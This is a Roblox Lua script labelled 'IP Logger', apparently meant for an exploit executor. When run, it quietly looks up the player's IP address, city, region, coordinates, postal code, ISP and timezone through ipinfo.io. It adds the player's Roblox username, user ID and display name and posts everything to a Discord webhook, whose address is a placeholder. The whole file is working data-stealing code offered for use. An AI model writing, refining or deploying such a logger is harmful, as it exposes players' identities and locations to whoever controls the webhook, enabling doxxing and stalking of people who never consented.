local http = game:GetService("HttpService")
local webhook="discord_web_hook"
local ipApi = "https://ipinfo.io/json"

local function grabIP()
    local ok,res = pcall(function()
        return game:HttpGet(ipApi)
    end)
    
    if ok then
        return http:JSONDecode(res)
    end
    return nil
end

local function sendData(data)
    if not data then return end
    
    local ipAddr = data.ip or "Unknown"
    local cityName = data.city or "Unknown"
    local regionName= data.region or "Unknown"
    local countryCode = data.country or "Unknown"
    local coords = data.loc or "Unknown"
    local isp = data.org or "Unknown"
    local zip = data.postal or "Unknown"
    local tz = data.timezone or "Unknown"
    
    local msg = {
        ["title"] = "🌐 IP Information Captured",
        ["color"] = 3447003,
        ["fields"] = {
            {
                ["name"] = "IP Address",
                ["value"] = ipAddr,
                ["inline"] = true
            },
            {
                ["name"] = "Location",
                ["value"] = string.format("%s, %s", cityName, regionName),
                ["inline"] = true
            },
            {
                ["name"] = "Country",
                ["value"] = countryCode,
                ["inline"] = true
            },
            {
                ["name"] = "Coordinates",
                ["value"] = coords,
                ["inline"] = true
            },
            {
                ["name"] = "Postal Code",
                ["value"] = zip,
                ["inline"] = true
            },
            {
                ["name"] = "Timezone",
                ["value"] = tz,
                ["inline"] = true
            },
            {
                ["name"] = "ISP/Organization",
                ["value"] = isp,
                ["inline"] = false
            }
        },
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        ["footer"] = {
            ["text"] = "IP Logger"
        }
    }
    
    local plr = game:GetService("Players").LocalPlayer
    if plr then
        table.insert(msg.fields,{
            ["name"] = "Roblox Username",
            ["value"] = plr.Name,
            ["inline"] = true
        })
        table.insert(msg.fields,{
            ["name"] = "User ID",
            ["value"] = tostring(plr.UserId),
            ["inline"] = true
        })
        table.insert(msg.fields, {
            ["name"] = "Display Name",
            ["value"] = plr.DisplayName,
            ["inline"] = true
        })
    end
    
    local payload={
        ["embeds"] = {msg}
    }
    
    local jsonStr = http:JSONEncode(payload)
    
    pcall(function()
        request({
            Url=webhook,
            Method = "POST",
            Headers={
                ["Content-Type"] = "application/json"
            },
            Body = jsonStr
        })
    end)
end


spawn(function()
    local ipInfo = grabIP()
    if ipInfo then
        sendData(ipInfo)
    end
end)
